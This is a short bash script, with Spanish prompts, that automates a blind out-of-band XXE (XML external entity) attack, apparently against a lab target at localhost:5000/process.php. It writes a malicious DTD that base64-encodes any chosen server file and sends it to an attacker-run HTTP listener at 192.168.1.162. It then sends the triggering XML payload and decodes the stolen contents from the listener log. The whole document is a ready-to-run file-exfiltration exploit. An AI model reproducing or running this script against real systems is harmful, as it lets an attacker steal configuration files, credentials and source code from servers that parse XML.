#!/bin/bash

echo -e "\n[+] Introduce el archivo a leer: " && read -r myFilename

malicious_dtd="""
<!ENTITY % file SYSTEM \"php://filter/read=convert.base64-encode/resource=$myFilename\">
<!ENTITY % eval \"<!ENTITY &#x25; exfil SYSTEM 'http://192.168.1.162/?contenido=%file;'>\">
%eval;
%exfil;"""

echo $malicious_dtd > malicious.dtd

python3 -m http.server 80 &>response &

PID=$!

sleep 1

curl -s -X POST "http://localhost:5000/process.php" -d '<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://192.168.1.162/malicious.dtd"> %xxe;]>
<root><name>lester</name><tel>123456789</tel><email>&myFile;</email><password>lester123</password></root>' &>/dev/null

cat response | grep -oP "/?contenido=\K[^.*\s]+" | base64 -d

kill -9 $PID
wait $PID 2>/dev/null

rm response 2>/dev/null
